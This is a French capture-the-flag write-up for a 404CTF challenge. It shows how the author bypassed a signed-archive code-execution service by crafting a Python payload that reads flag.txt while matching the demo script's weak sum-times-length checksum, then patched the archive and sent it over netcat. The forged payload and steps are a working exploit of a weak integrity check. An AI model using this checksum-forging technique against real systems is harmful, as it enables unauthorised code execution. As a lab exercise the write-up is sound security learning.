> Un nouveau système a été mis en place pour exécuter du code de façon sécurisée sur l'infrastructure. Il suffit d'envoyer une archive signée et encodée en base 64 pour exécuter le code Python qu'elle contient !
> 
> Vous trouverez la documentation de ce système et un exemple en pièces jointes. Tentez de voir si vous ne pourriez pas l'exploiter afin de lire le précieux fichier flag.txt
>
> Netcat: nc challenge.404ctf.fr 32441


> Vous avez mon Cut.ipynb pour voir mon evolution

1. On a la checksum de base:

```python
>>> u = b'# This is a demo script. It doesn\'t do much, but I like it. You can use it too if you want :D\n\nprint("Hello, CTF player!")'
>>> sum(u)*len(u), len(u)
1235738, 122
``` 
2. On va donc essayer d'avoir la meme checksum pour ne pas changer le header
3. Donc on crée:
```python
>>> v = b'print(open("flag.txt", "r").read()) #zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz`000000000000000000000000000000000000000000'
>>> sum(v)*len(v), len(v)
1235738, 122
```
4. On peut maintenant le modifier dans l'archive avec bvi on a `script.py.zsig` qui est modifier
5. On le base64:
`cat script.py.zsig | base64`
6. On le input dans le nc Et on à:



| `404CTF{Th1s_Ch3cksum_W4s_Tr4sh}` |
|-----------------------------------|
